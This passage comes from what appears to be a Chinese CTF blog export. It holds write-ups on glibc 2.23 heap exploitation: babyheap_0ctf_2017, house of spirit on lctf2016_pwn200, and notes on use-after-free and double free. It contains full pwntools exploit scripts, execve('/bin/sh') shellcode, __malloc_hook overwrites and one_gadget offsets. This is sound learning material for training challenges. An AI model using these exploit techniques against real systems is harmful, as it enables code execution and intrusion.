class="string">&quot;libc_leak&quot;</span>,libc_leak)</span><br><span class="line">offset=<span class="number">0x3c4b78</span>  <span class="comment">#0x7ad119fc4b78-0x7ad119c00000</span></span><br><span class="line">libc_base=libc_leak-offset</span><br><span class="line"><span class="comment">#size_ptr=0x602140</span></span><br><span class="line"><span class="comment">#heap_ptr=0x6020c0</span></span><br><span class="line">fake_size=<span class="number">0x3c4af5</span>+libc_base</span><br><span class="line">fake_chunk=fake_size-<span class="number">8</span></span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(fake_chunk))</span><br><span class="line">create(<span class="number">5</span>,<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* 0x400D25&#x27;)</span></span><br><span class="line">one_gadget1=<span class="number">0x4527a</span>+libc_base</span><br><span class="line">one_gadget2=<span class="number">0xf03a4</span>+libc_base</span><br><span class="line">one_gadget3=<span class="number">0xf1247</span>+libc_base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(one_gadget3)</span><br><span class="line">edit(<span class="number">6</span>,payload)</span><br><span class="line">create(<span class="number">7</span>,<span class="number">0x20</span>)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h1 id="碰壁记录"><a href="#碰壁记录" class="headerlink" title="碰壁记录"></a>碰壁记录</h1><p>其实实际在做这个题的时候遇到了很多问题，我想法非常多，处处碰壁，这里记录一下碰壁遇到的知识。</p><p>我一开始想法非常复杂，因为有一个size数组，这个size是我们自己写的，那么就有可能申请到size数组上来，然后再前向重叠，把前面的堆指针数组给合并掉，这样就可以改写这个数组的内容来任意地址写了。</p><p>一开始申请到size上比较顺利，虽然中间因为分不清house of spirit和Arbitrary Alloc导致走了一点弯路，不过最后还是成功了。结果在前向合并的时候发现，好像在合并的时候我没法更改堆指针数组，导致合并失败，就此作罢。</p><p>后来又想到Arbitrary Alloc 好像没这么多限制，又查了一下Arbitrary Alloc的东西就想到了可以直接申请到__malloc_hook附件的空间，从而改写成one_gadget。</p><p>这里泄漏libc是利用的之前学过的unsorted bin的东西。</p><p>Arbitrary Alloc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">检查1：检测你要malloc的free chunk的大小是否在该chunk所在的fastbin链的大小尺寸范围（例如：一个fastbin链所存储的chunk大小必须在0x30-0x40之间，但是你要申请的这free chunk却是0x50，那么就会程序就报错退出）。</span><br><span class="line">检查2：检测你这个free chunk的size成员的PREV_INUSE为是否为1，为1才可以通过检测。</span><br><span class="line"></span><br><span class="line">所以构造例如0x70的fastbin，fake_size在[0x70,0x7f]区间都能满足第一个size检查</span><br></pre></td></tr></table></figure><p>这里没有对fake chunk的地址对齐有要求，可以利用字节错位来随意申请地址。</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2024/10/21/2024-10-21-babyheap_0ctf_2017/"/>
      <url>/2024/10/21/2024-10-21-babyheap_0ctf_2017/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一篇题解，glibc2.23 主要是fastbins攻击的</p><blockquote><p><a href="https://www.yuque.com/hxfqg9/bin/dww8nz#EPTbD">https://www.yuque.com/hxfqg9/bin/dww8nz#EPTbD</a></p></blockquote><p>主要参考这个师傅的</p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目开全了保护，因此就无法通过改got表的方式getshell</p><p>这个题相当于自己写了一个堆管理器，在填充（fill）的时候，还要求输入你要填充后过多少个字节，但是可以输入比申请的大的数，因此可以任意的进行堆溢出</p><p>先贴出自己的exp，实际上只能本地打，不知道为什么远程报超时？我看alarm函数给了60秒</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_0ctf_2017&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28312)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#elf=ELF(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">number</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(number))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">malloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload_change_1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload_change_1),payload_change_1)</span><br><span class="line">payload_change_4_size=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload_change_4_size),payload_change_4_size)</span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload_change_4_size=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload_change_4_size),payload_change_4_size)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">a=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">libc_base=a-<span class="number">0x74361ddc4b78</span>+<span class="number">0x74361da00000</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">one_gadget_addr1=<span class="number">0x4527a</span>+libc_base</span><br><span class="line">one_gadget_addr2=<span class="number">0xf03a4</span>+libc_base</span><br><span class="line">one_gadget_addr3=<span class="number">0xf1247</span>+libc_base</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">addr=libc_base+<span class="number">0x3c4aed</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(p64(addr)),p64(addr))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(one_gadget_addr1)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">malloc(<span class="number">255</span>)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><p>malloc函数里用的不是malloc，而是calloc</p><p>calloc主要区别在于会将申请到的内存空间清零，这也就是说没办法free之后malloc然后show</p><p>堆溢出  &#x3D;&#x3D;&#x3D;&gt; 可以修改空闲fastbin块的fd指针</p><p>修改了空闲fastbin块fd指针之后，被指向的区域的size只要是合法的就可以，这个也可以通过堆溢出或者错位来实现</p><p>整体思路是这样的：</p><ol><li>泄漏出libc基地址</li><li>修改malloc_hook 为one_gadget地址，实现getshell</li></ol><p>如何泄漏出libc基地址？</p><p>假如我们可以free掉一个smallbin的堆块，此时这个堆块的fd和bk指针都指向了unsortedbin的地址，这个玩意是在main_arena结构体里面，通过这个也就可以泄漏出libc基地址</p><p>这个题来说，我们能不能实现？显然是可以的，我们可以想办法让两个堆指针指向同一个堆块，这样既能释放它也能读取或者写入它</p><p>具体实现是这样的：我们先申请几块堆</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#0 用来堆溢出改写空闲的idx1内容的</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#1 被改写fd指针，从而实现申请的时候申请到idx4上去</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#2 </span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#3 用来堆溢出改写idx4的size</span></span><br><span class="line">malloc(<span class="number">0x80</span>) <span class="comment">#4 我们未来要把这个释放到unsortedbin里面</span></span><br><span class="line">malloc(<span class="number">0x10</span>) <span class="comment">#5 防止释放idx4的时候被合并</span></span><br></pre></td></tr></table></figure><p>然后先释放掉2，再释放掉1</p><p>这样就是 fastbin &#x3D;&gt;idx1 &#x3D;&gt; idx2 &#x3D;&gt; NULL</p><p>我们接下来通过idx0的堆溢出改写idx1的fd指针到idx4</p><p>然后利用idx3的堆溢出改写idx4的size，(注意要0x21)，保证落到和他们一样大小的fastbin里面</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload_change_1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+<span class="string">b&#x27;\x80&#x27;</span></span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload_change_1),payload_change_1)</span><br><span class="line">payload_change_4_size=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload_change_4_size),payload_change_4_size)</span><br></pre></td></tr></table></figure><p>再接下来就是这样了</p><p>fastbin &#x3D;&gt;idx1 &#x3D;&gt; idx4</p><p>我们申请两次，那原本idx2的堆指针指向的就是idx4了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0x10</span>)</span><br><span class="line">malloc(<span class="number">0x10</span>)</span><br></pre></td></tr></table></figure><p>我们之后fill 2就是fill 4</p><p>之后我们需要需要让idx4释放到unsortedbin里面，这样dump 2 就会把idx4的 fd指针也就是unsortedbin地址泄漏出来，这样就能得到libc基地址</p><p>但是我们之前把idx4的size改了，因此需要改回来再释放</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload_change_4_size=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload_change_4_size),payload_change_4_size)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>然后就是接收地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ru(<span class="string">&#x27;Content: \n&#x27;</span>)</span><br><span class="line">a=uu64(p.recv(<span class="number">6</span>))</span><br><span class="line">libc_base=a-<span class="number">0x74361ddc4b78</span>+<span class="number">0x74361da00000</span></span><br><span class="line">leak(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">one_gadget_addr1=<span class="number">0x4527a</span>+libc_base</span><br><span class="line">one_gadget_addr2=<span class="number">0xf03a4</span>+libc_base</span><br><span class="line">one_gadget_addr3=<span class="number">0xf1247</span>+libc_base</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@tgr-virtual-machine:/home/tgr/桌面/babyheap# one_gadget ./libc-2.23.so </span><br><span class="line">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL || &#123;[rsp+0x30], [rsp+0x38], [rsp+0x40], [rsp+0x48], ...&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL || &#123;[rsp+0x50], [rsp+0x58], [rsp+0x60], [rsp+0x68], ...&#125; is a valid argv</span><br><span class="line"></span><br><span class="line">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是one_gadget的使用</p><p>我们现在已经完成了第一步，接下来就是第二步，修改__malloc_hook的值为onegadget的地址</p><p>首先我们得先把idx4变成fastbin，因为它只需要fd指针以及fd指向的堆块的size位合法即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">addr=libc_base+<span class="number">0x3c4aed</span></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(p64(addr)),p64(addr))</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">malloc(<span class="number">0x60</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span>+p64(one_gadget_addr1)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* $rebase(0x113D)&#x27;)</span></span><br><span class="line">malloc(<span class="number">255</span>)</span><br></pre></td></tr></table></figure><p>我们之前释放了4，现在再malloc 0x60，它会切割原来的idx4，返回的地址还是之前的地址</p><p>然后释放它，接下来我们可以fill 2 来修改idx4的fd指针</p><p>这个地址就是通过错位来让size是合法的</p><p>之后我们申请两个堆块，这样会填充原来的idx4和新的idx6，idx6里面就有__malloc_hook</p><p>然后修改__malloc_hook为onegadget值即可，最后再malloc一次就能getshell了</p><h1 id="学到的知识"><a href="#学到的知识" class="headerlink" title="学到的知识"></a>学到的知识</h1><p>泄漏libc的另一种方式：将非fastbin的堆块释放掉，这样就会扔进unsortedbin里面，如果能通过某种方式展示这个空闲块的fd指针，就能得到libc地址了</p><p>get_shell的另一种方式：修改malloc_hook或者free_hook的地址，即使在保护全开的程序里面也可以使用，但是前提是得泄漏libc地址</p><blockquote><p><a href="https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/">https://seanachao.github.io/2020/07/13/hook%E5%8A%AB%E6%8C%81/</a></p></blockquote><p>如果能通过堆溢出、double free或者其他方式，来让两个堆指针指向同一个堆块，那么进行之后的操作将会方便非常多</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>house_of_spirit</title>
      <link href="/2024/10/18/2024-10-18-house_of_spirit/"/>
      <url>/2024/10/18/2024-10-18-house_of_spirit/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-spirit"><a href="#House-of-spirit" class="headerlink" title="House of spirit"></a>House of spirit</h1><p>一种针对fastbin的攻击</p><h2 id="什么情况下使用？"><a href="#什么情况下使用？" class="headerlink" title="什么情况下使用？"></a>什么情况下使用？</h2><p>当有一块区域，这个区域上下两部分你都能控制，但是区域内部无法控制，并且区域内部有重要数据，比如返回地址。</p><p>（一般来说，这块区域指的是某个函数栈帧的位置，这个函数的父函数中有局部变量能够控制，这个函数里面还有局部变量你能够控制）</p><p>使用house of spirit可以通过控制前后区域来控制整片区域。</p><h2 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h2><ul><li><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理</p></li><li><p>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK (0x10!! )</p></li><li><p>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐  （size直接写成0xN0即可）</p></li><li><p>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ  (16)，同时也不能大于av-&gt;system_mem（128kb)</p></li><li><p>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况</p></li></ul><p>（64位情况下）</p><p>libc2.23版本</p><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>*(fake_chunk_addr+8)&#x3D;size (当前fake chunk的size 直接0xN0即可)</p><p>fake_chunk物理相邻的下一个chunk的size也要设置，16&lt;size&lt;128kb</p><p>然后free(fake_chunk)</p><p>然后malloc(fake_chunk)</p><p>之后就可以控制这个fake_chunk的所有内容了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><blockquote><p><a href="https://buuoj.cn/challenges#lctf2016_pwn200">https://buuoj.cn/challenges#lctf2016_pwn200</a></p></blockquote><p>libc_2.23版本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn200&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26024</span>)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x: u64(x.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr :log.success(name+<span class="string">&quot;---&gt;&quot;</span>+<span class="built_in">hex</span>(addr))</span><br><span class="line">shellcode=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rsi, rsi</span></span><br><span class="line"><span class="string">pushrsi</span></span><br><span class="line"><span class="string">mov rdi, 0x68732f2f6e69622f</span></span><br><span class="line"><span class="string">pushrdi</span></span><br><span class="line"><span class="string">pushrsp</span></span><br><span class="line"><span class="string">pop    rdi</span></span><br><span class="line"><span class="string">mov al,59</span></span><br><span class="line"><span class="string">cdq</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">fake_size=p64(<span class="number">0x1234</span>) </span><br><span class="line">payload=shellcode</span><br><span class="line">payload=payload.ljust(<span class="number">44</span>,<span class="string">b&#x27;\x90&#x27;</span>)+<span class="string">b&#x27;abcd&#x27;</span></span><br><span class="line">sa(<span class="string">&quot;u?\n&quot;</span>,payload)</span><br><span class="line">ru(<span class="string">&#x27;abcd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rbp=uu64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:])</span><br><span class="line">leak(<span class="string">&quot;rbp:&quot;</span>,rbp)</span><br><span class="line">shellcode_addr=rbp-<span class="number">0x50</span></span><br><span class="line"><span class="comment">#buf_addr=rbp+0x7fffffffe460-0x7fffffffe4b0-0x10</span></span><br><span class="line">fake_chunk_ptr=shellcode_addr-<span class="number">0x40</span></span><br><span class="line">rbp_addr=shellcode_addr-<span class="number">0x28</span></span><br><span class="line"><span class="comment"># rbp=0x7fffffffe4b0</span></span><br><span class="line"><span class="comment"># ret=0x7fffffffe4a0</span></span><br><span class="line"><span class="comment"># name=0x7fffffffe460</span></span><br><span class="line">ru(<span class="string">&quot;id ~~?\n&quot;</span>)</span><br><span class="line">sl(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line"><span class="comment">#payload=p64(fake_chunk_ptr)+b&#x27;\x00&#x27;+b&#x27;d&#x27;*39+p64(0x30)+p64(fake_chunk_ptr)</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x40</span>)+p64(<span class="number">0</span>)+p64(fake_chunk_ptr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>,payload)</span><br><span class="line">sa(<span class="string">&quot;money~\n&quot;</span>,payload)</span><br><span class="line">ru(<span class="string">&#x27;your choice : &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;your choice : &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;how long?\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;48&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(rbp_addr)+p64(shellcode_addr)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b* 0x400948&#x27;)</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">&#x27;your choice : &#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">leak(<span class="string">&quot;fake_chunk_ptr&quot;</span>,fake_chunk_ptr)</span><br><span class="line">ti()</span><br></pre></td></tr></table></figure><h2 id="思考点"><a href="#思考点" class="headerlink" title="思考点"></a>思考点</h2><ol><li><p>如何最后getshell?</p><p>checksec之后发现nx没有开，那么可以考虑ret2shellcode</p></li><li><p>如何泄漏栈地址？</p><p>printf(“%s”,name);</p><p>利用这个函数，注意name输入的时候不能有\x00，否则会截断，结合第一点，我们可以在name这里写入shellcode</p></li><li><p>如何使用house_of_spirit？</p><p>house_of_spirit关键点就是怎么找fake_chunk，以及如何修改</p><p>在give_me_money里面，可以刚好溢出到堆指针，最后也是将这个指针给了全局变量，因此这个指针应该写入fake_chunk的用户地址。</p><p>在它下面有之前我们可以控制的id作为fake_chunk的物理相邻的下一个chunk的size（再下面的shellcode不能作为size,因为在泄漏栈地址时不能存在\x00）（这个点也是卡住我的点，我没有意识到id这个空间可以被控制……）</p><p>在它上面就是buf，我们可以完全控制，另外为了不让strcpy破坏我们的构造，我们可以在buf最开始写\x00来截断。</p><blockquote><p><a href="https://blog.csdn.net/SWEET0SWAT/article/details/98852678">https://blog.csdn.net/SWEET0SWAT/article/details/98852678</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆1</title>
      <link href="/2024/10/18/2024-10-18-%E5%A0%86%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/10/18/2024-10-18-%E5%A0%86%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>很久之前学过一点堆知识，如今再次拾起来发现需要重新再学一遍……</p><p>因此在这里写一点自己在学习过程中的想法，以便未来的我看到这里可以快速想起知识</p><blockquote><p><a href="https://www.yuque.com/hxfqg9/bin/ape5up#kcNpL">https://www.yuque.com/hxfqg9/bin/ape5up#kcNpL</a></p></blockquote><h1 id="简单堆结构"><a href="#简单堆结构" class="headerlink" title="简单堆结构"></a>简单堆结构</h1><p>使用中的：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587362868741-7c71aa7f-6a81-413f-be45-e8d9c70200ac.png?x-oss-process=image/format,webp"></p><p>基本来说是这个样子：</p><table><thead><tr><th align="right">物理相邻的前堆块的大小</th><th>本堆块的大小</th></tr></thead><tbody><tr><td align="right">用户可以使用的空间开始</td><td></td></tr></tbody></table><p>注意P位，当它是0的时候标志物理相邻的前一个堆块是被释放的，有时候可以合并</p><p>被释放后的：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1587623626922-24734695-032f-48eb-8ea0-7a615ee1cc3b.png?x-oss-process=image/format,webp"></p><table><thead><tr><th align="right">物理相邻的前堆块的大小</th><th>本堆块的大小</th></tr></thead><tbody><tr><td align="right">fd指针</td><td>bk指针</td></tr><tr><td align="right">fd_next_chunk指针</td><td>bk_previous_chunk指针</td></tr></tbody></table><p>fastbin的时候（空间小的堆块回收到的地方）,基本只用关注fd指针，fd指针指向前一个释放的堆块（同等大小）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>这个时候b堆块的fd指针就指向a开始的地方。但是要注意用户开始使用的空间和堆块开始的空间不一样，一般是+0x10。</p><h1 id="UAF漏洞"><a href="#UAF漏洞" class="headerlink" title="UAF漏洞"></a>UAF漏洞</h1><p>如果free(a)之后没有a&#x3D;0，那么还能再使用a这个指针。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="comment">//a=0;</span></span><br><span class="line"><span class="comment">//存在uaf漏洞</span></span><br></pre></td></tr></table></figure><h1 id="简单的double-free"><a href="#简单的double-free" class="headerlink" title="简单的double free"></a>简单的double free</h1><p>libc2.26之后加了tcache，这里讲的是libc2.23版本的</p><p>因为free的时候会检查fastbin最上面的是不是和free的相同，相同的话会报错，因此我们可以free(a)之后再free(b)再free(a)。</p><p>这时候a b的fd指针就是互相指向的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line">d=<span 